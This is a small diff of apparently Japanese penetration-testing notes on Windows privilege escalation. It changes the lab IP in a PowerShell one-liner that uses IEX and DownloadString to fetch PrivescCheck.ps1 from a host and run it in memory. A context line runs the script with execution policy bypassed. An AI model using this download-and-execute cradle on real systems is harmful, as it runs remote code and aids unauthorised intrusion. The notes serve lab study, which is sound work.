@@ -21,7 +21,7 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 * powershellを実行
 
 ```powershell
-powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://192.168.45.211/PrivescCheck.ps1')
+powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://192.168.45.207/PrivescCheck.ps1')
 ```
 
 
